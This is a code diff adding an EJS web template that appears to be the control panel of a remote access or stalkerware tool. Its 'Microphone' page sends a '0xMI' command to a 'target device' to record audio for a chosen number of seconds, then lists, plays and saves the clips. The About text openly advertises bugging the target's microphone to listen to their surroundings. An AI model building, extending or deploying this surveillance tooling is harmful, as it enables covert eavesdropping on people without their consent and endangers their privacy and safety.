@@ -1,0 +1,161 @@
+
+ <div class="recent-sales box">
+    <div class="title">Microphone</div>
+    <div class="sales-details">
+        <ul class="details">
+            <li class="topic">Recording Time</li>
+            <div class="ui inverted segment">
+                <div>
+                    <div class="ui action input fluid">
+                        <input style="background-color: #2f2f2f !important; padding: 10px; border-style: none; border-radius: 7px; color: white;" type="number" placeholder="Duration (seconds)" min="0" max="120" id="seconds">
+                    </div>
+                    <div class="ui attached progress indicating active" id="recProg">
+                        <div class="bar"></div>
+                    </div>
+                </div>
+                <audio id="player" class="inverted" playing="0">
+                    <source id="audioSource" src="" type="audio/mpeg">
+                    </source>
+                    Your browser does not support the audio element.
+                </audio> <br>
+
+
+                <% pageData.forEach((item) => { 
+                    let date = new Date(item.time);
+                %>
+        
+                <%= date.toLocaleString('en-GB', { timeZone: 'UTC' }) %> <br>
+        
+                <% }) %>
+
+
+        </ul>
+
+        <ul class="details">
+            <li class="topic">Name</li>
+            
+        <h1>-></h1> <br>
+
+        <% pageData.forEach((item) => { 
+            let date = new Date(item.time);
+        %> 
+
+        <%= item.originalName %> <br>
+
+        <% }) %>
+        </ul>
+
+        <ul class="details">
+            <li class="topic">Actions</li>
+            
+        <button style="background-color: #2f2f2f !important; padding: 10px; border-style: none; border-radius: 7px; color: white;" onclick="record(this)" class="ui red inverted left labeled icon button">
+            Record
+        </button> <br>
+
+
+        <% pageData.forEach((item) => { 
+            let date = new Date(item.time);
+        %>
+
+        <div class="ui buttons" style="display: flex; justify-content: center; align-items: center;">
+        <button style="background-color: #2f2f2f !important; padding: 10px; border-style: none; border-radius: 7px; color: white;" onclick="playPauseClip('<%= item.path %>')" class="ui red inverted left labeled icon button">
+            Play
+        </button><button style="background: none;border-style: none; color: white;" onclick="playPauseClip('<%= item.path %>')" class="ui red inverted left labeled icon button">
+            <a style="padding: 10px; border-style: none; border-radius: 7px;" href="<%= item.path %>" target="_blank"">Save</a>
+        </button>
+        </div><br>
+
+
+        <% }) %>
+
+
+
+        </ul>
+    </div>
+    <!-- not needed -->
+    <!-- <button style="background: rgb(11, 0, 107); color: white; border-style: none; padding: 7px;" onclick="updateButton(this, '0xIN')">Update</button> -->
+    </div>
+    <div class="top-sales box">
+      <div class="title">About</div>
+      <ul class="top-sales-details">
+        <li>
+        <a href="#">
+          <!--<img src="images/sunglasses.jpg" alt="">-->
+          <span class="product">
+            You must be all Ears, as listening is the best skill in surveillance. And this software makes it
+            possible to bug the microphone of your target device, so you can listen to the surroundings</span>
+        </a>
+      </li>
+      </ul>
+      <div class="button">
+        <a href="#">Learn More</a>
+      </div>
+    </div>
+   
+    
+</div>
+<audio id="player" class="inverted" preload="auto" playing="0">
+    <source id="audioSource" src="" type="audio/mpeg">
+    </source>
+    Your browser does not support the audio element.
+</audio>
+<script>
+
+    
+
+    function playPauseClip(input) {
+        var player = document.getElementById('player');
+        const playing = player.getAttribute('playing');
+        const playBtn = document.getElementById(input);
+        
+        if(+playing) {
+            player.pause();
+            player.setAttribute('playing', '0');
+            playBtn.innerText = 'Play';
+      
+    }
+    
+        if(!(+playing)) {
+            if(!($("#audioSource").attr("src") === input)) {
+            $("#audioSource").attr("src", input);
+        player.load();
+        }
+        player.loop = true;
+        
+        var playPromise = player.play();
+        
+        player.setAttribute('playing', '1');
+        
+        playBtn.innerText = 'Pause';
+        }
+       
+    }
+
+    function record(element) {
+            $(element).addClass('loading')
+            let sec = $('#seconds').val();
+            sendCommand('0xMI', { sec }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error)
+                        $(element).removeClass('loading')
+                    }, 300)
+                } else {
+                    setTimeout(() => {
+                        $(element).removeClass('loading');
+                        let timeLeft = ((parseInt(sec) + 15) * 1000);
+                        let timeItsGonnaTake = (parseInt(sec) + 10);
+                        if (message === 'Requested') {
+                            showNotification('#2ecc71', 'Now Recording, Check back in ' + timeItsGonnaTake + ' ish Seconds for the result!');
+                            let cdInterval = setInterval(() => {
+                                timeLeft = timeLeft - 100;
+                                let percent = (((timeItsGonnaTake * 1000) * 100) / timeLeft) - 100;
+                                $('#recProg').progress({ percent });
+                                if (percent > 100) window.location = window.location;
+                            }, 100)
+                        } else showNotification('#2ecc71', message);
+                    }, 300)
+                }
+            });
+        }
+</script>
